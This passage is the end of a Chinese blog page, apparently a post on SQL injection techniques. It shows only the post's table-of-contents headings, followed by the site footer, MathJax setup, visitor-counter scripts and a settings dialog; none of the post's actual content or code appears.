class="nav-text">9.1 手动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-2-%E8%84%9A%E6%9C%AC"><span class="nav-number">1.7.5.</span> <span class="nav-text">9.2 脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E3%80%81%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5"><span class="nav-number">1.8.</span> <span class="nav-text">十、异或注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">1.9.</span> <span class="nav-text">十一、宽字节注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">1.10.</span> <span class="nav-text">十二、二次注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%89%E3%80%81%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">1.11.</span> <span class="nav-text">十三、堆叠注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E5%9B%9B%E3%80%81HTTP-%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5"><span class="nav-number">1.12.</span> <span class="nav-text">十四、HTTP 头部注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#14-1-User-Agent-%E6%B3%A8%E5%85%A5"><span class="nav-number">1.12.1.</span> <span class="nav-text">14.1 User-Agent 注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#14-2-Referer-%E6%B3%A8%E5%85%A5"><span class="nav-number">1.12.2.</span> <span class="nav-text">14.2 Referer 注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#14-3-Cookie-%E6%B3%A8%E5%85%A5"><span class="nav-number">1.12.3.</span> <span class="nav-text">14.3 Cookie 注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%BA%94%E3%80%81%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="nav-number">1.13.</span> <span class="nav-text">十五、无列名注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#15-1-%E4%BD%BF%E7%94%A8%E5%88%AB%E7%9A%84%E5%85%B7%E6%9C%89%E7%B1%BB%E4%BC%BC%E5%8A%9F%E8%83%BD%E7%9A%84%E5%BA%93"><span class="nav-number">1.13.1.</span> <span class="nav-text">15.1 使用别的具有类似功能的库</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#15-1-1-sys-%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">1.13.1.1.</span> <span class="nav-text">15.1.1 sys 数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#15-1-2-mysql-%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E-INNODB-%E6%89%80%E6%90%BA%E5%B8%A6%E7%9A%84%E8%A1%A8"><span class="nav-number">1.13.1.2.</span> <span class="nav-text">15.1.2 mysql 默认存储引擎 INNODB 所携带的表</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#15-2-union-select-%E6%9E%84%E9%80%A0%E8%99%9A%E8%A1%A8"><span class="nav-number">1.13.2.</span> <span class="nav-text">15.2 union select 构造虚表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#15-3-JOIN-%E7%88%86%E7%A0%B4"><span class="nav-number">1.13.3.</span> <span class="nav-text">15.3 JOIN 爆破</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E5%85%AD%E3%80%81Mysql-%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5-%E4%B9%8B-Handler"><span class="nav-number">1.14.</span> <span class="nav-text">十六、Mysql 查询语句 之 Handler</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%83%E3%80%81SQLmap"><span class="nav-number">1.15.</span> <span class="nav-text">十七、SQLmap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#17-1-%E5%9F%BA%E6%9C%AC%E6%89%8B%E6%B3%95"><span class="nav-number">1.15.1.</span> <span class="nav-text">17.1 基本手法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#17-2-%E8%BF%9B%E9%98%B6"><span class="nav-number">1.15.2.</span> <span class="nav-text">17.2 进阶</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#17-3-%E2%80%93tamper"><span class="nav-number">1.15.3.</span> <span class="nav-text">17.3 –tamper</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E5%85%AB%E3%80%81%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF-str-replace"><span class="nav-number">1.16.</span> <span class="nav-text">十八、绕过姿势   str_replace()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B9%9D%E3%80%81%E5%85%B6%E5%AE%83"><span class="nav-number">1.17.</span> <span class="nav-text">十九、其它</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E5%8D%81%E3%80%81%E8%A7%A3%E5%86%B3%E6%9F%A5%E5%86%85%E5%AE%B9%E6%97%B6%E4%B8%80%E6%AC%A1%E6%98%BE%E7%A4%BA%E4%B8%8D%E5%85%A8"><span class="nav-number">1.18.</span> <span class="nav-text">二十、解决查内容时一次显示不全</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9Aregexp-%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="nav-number">2.</span> <span class="nav-text">总结：regexp 正则匹配速查表</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Mysql-%E5%AF%B9%E6%96%87%E4%BB%B6%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="nav-number">3.</span> <span class="nav-text">Mysql 对文件的操作</span></a></li></ol>
    
    </div>
  </aside>

</section>
        
      </div>
      
      <footer id="footer">
  

  <div class="container">
      	<div class="row">
	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
	      <p id="copyRightEn">Copyright &copy; 2013 - 2021 忆 执 昔 来 的 旅 途 All Rights Reserved.</p>
	      
	      
    		<p class="busuanzi_uv">
				UV : <span id="busuanzi_value_site_uv"></span> |  
				PV : <span id="busuanzi_value_site_pv"></span>
		    </p>
  		   
		</div>

		
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");
    var allheader = document.getElementById("allheader");

    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
    if (allheader != null) {
      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    } else {
      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    }
</script>
    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/categories" class="mobile-nav-link">Categories</a>
  
    <a href="/tags" class="mobile-nav-link">Tags</a>
  
    <a href="/essayists" class="mobile-nav-link">Essayists</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/scripts.js"></script>





  
<script src="/js/dialog.js"></script>









	<div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
  </div>



	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
	</script>






  </div>

  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h2 class="modal-title" id="myModalLabel">设置</h2>
      </div>
      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">


      <div class="modal-body">
          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
              正文字号大小
            </a>
          </div>
          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
          <div class="panel-body">
            您已调整页面字体大小
          </div>
        </div>
      


          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
              夜间护眼模式
            </a>
        </div>
          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
          <div class="panel-body">
            夜间模式已经开启，再次单击按钮即可关闭 
          </div>
        </div>

        <div>
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
        </div>
         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
          <div class="panel-body">
            忆 执 昔 来 的 旅 途
          </div>
          <div class="panel-body">
            Copyright © 2021 xizhi-future All Rights Reserved.
          </div>
        </div>
      </div>


      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <div class="modal-footer">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
      </div>
    </div>
  </div>
</div>
  
  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
  
    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
  
</body>
</html>